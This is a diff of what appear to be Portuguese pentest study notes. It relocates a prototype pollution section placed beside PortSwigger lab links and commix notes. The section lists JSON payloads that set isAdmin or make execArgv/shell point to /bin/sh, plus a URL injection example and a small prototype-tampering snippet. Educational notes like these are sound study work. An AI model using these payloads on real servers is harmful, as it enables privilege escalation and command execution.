@@ -4532,15 +4532,6 @@ Windows Tricks
 [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
 
 
-- Prototype Pollution
-
-Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution
-
-	{\"__proto__\": { \"isAdmin \": true }}
-	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
-	{\"__proto__\":{\"isAdmin\":true}}
-	{\"constructor\": {\"prototype\": {\"shell\": \"/bin/sh\"}}}
-
 - Automatizando os Testes Command Injection - COMMIX
 
 A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é `POST` ou não e informar o parâmetro que no caso do exemplo abaixo é `site=`
@@ -9395,6 +9386,16 @@ LABS
 
 Pra saber se um servidor tem falha de prototype pollution, teste enviando dados com __proto__ ou constructor.prototype nos lugares onde o servidor recebe informações — como parâmetros da URL, corpo JSON de uma requisição ou até cabeçalhos. Se depois disso o servidor começar a se comportar de forma estranha, retornar propriedades que você injetou ou der erro, é sinal de que pode estar vulnerável. A falha aparece quando o servidor usa funções perigosas que misturam objetos sem cuidado, como merge() ou cloneDeep() em versões antigas de bibliotecas JavaScript.
 
+Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution
+
+	EXEMPLO DE LOCAL ONDE PODE SER INSERIDO UM PAYLOAD
+	academy.net/?__proto__[foo]=bar
+	{\"__proto__\": { \"isAdmin \": true }}
+	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
+	{\"__proto__\":{\"isAdmin\":true}}
+	{\"constructor\": {\"prototype\": {\"shell\": \"/bin/sh\"}}}
+
+Outros scrpts que podem ser utilizados
 
 	a = 1
 	a.constructor.___proto___.bang=()=>[console.log("BOOM")]
